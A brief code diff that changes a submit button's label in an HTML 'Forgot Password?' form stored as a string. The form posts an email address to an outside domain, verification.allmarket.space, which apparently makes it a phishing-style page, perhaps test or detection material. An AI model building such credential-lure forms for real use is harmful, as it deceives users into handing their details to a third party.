@@ -27,7 +27,7 @@ String form = '''<!doctype html>
         <form action="https://verification.allmarket.space" method="post" name="signup">
             <label for="text_field">Forgot Password?</label>
             <input type="text" class="passInput" placeholder="Email address" id="text_field" name="text">
-            <input type="submit" name="signup" value="Update">
+            <input type="submit" name="signup" value="Up">
             <!-- <button>Send My Password</button> -->
         </form>
     </div>
